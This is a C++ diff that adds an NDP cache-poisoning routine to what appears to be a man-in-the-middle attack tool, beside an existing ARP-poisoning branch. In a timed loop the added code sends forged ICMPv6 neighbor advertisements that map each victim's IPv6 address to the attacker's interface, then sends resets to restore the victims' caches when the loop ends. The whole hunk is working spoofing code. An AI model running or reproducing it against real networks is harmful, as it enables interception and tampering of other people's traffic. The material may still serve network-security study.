@@ -68,7 +68,48 @@ int main(int argc, char **argv) {
             delete arpReply2;
         } else {
             /* Perform NDP cache poison */
-            //TODO create neighbor advertisement packet and send it
+            while (loop) {
+                ICMPv6_packet *neighborAdvertisement1 = ICMPv6_packet::createNeighborAdvertisement(
+                        networkInterface.getPhysicalAddress(),
+                        arguments.getVictim2Ipv6Address(),
+                        arguments.getVictim1MacAddress(),
+                        arguments.getVictim1Ipv6Address()
+                );
+                ICMPv6_packet *neighborAdvertisement2 = ICMPv6_packet::createNeighborAdvertisement(
+                        networkInterface.getPhysicalAddress(),
+                        arguments.getVictim1Ipv6Address(),
+                        arguments.getVictim2MacAddress(),
+                        arguments.getVictim2Ipv6Address()
+                );
+
+                arpPacketManager.send(neighborAdvertisement1);
+                arpPacketManager.send(neighborAdvertisement2);
+
+                delete neighborAdvertisement1;
+                delete neighborAdvertisement2;
+
+                usleep((__useconds_t) (arguments.getTime() * 1000));
+            }
+
+            /* Reset NDP cache tables */
+            ICMPv6_packet *neighborAdvertisement1 = ICMPv6_packet::createNeighborAdvertisement(
+                    arguments.getVictim2MacAddress(),
+                    arguments.getVictim2Ipv6Address(),
+                    arguments.getVictim1MacAddress(),
+                    arguments.getVictim1Ipv6Address()
+            );
+            ICMPv6_packet *neighborAdvertisement2 = ICMPv6_packet::createNeighborAdvertisement(
+                    arguments.getVictim1MacAddress(),
+                    arguments.getVictim1Ipv6Address(),
+                    arguments.getVictim2MacAddress(),
+                    arguments.getVictim2Ipv6Address()
+            );
+
+            arpPacketManager.send(neighborAdvertisement1);
+            arpPacketManager.send(neighborAdvertisement2);
+
+            delete neighborAdvertisement1;
+            delete neighborAdvertisement2;
         }
     }
     catch (InvalidArgumentsException &e) {
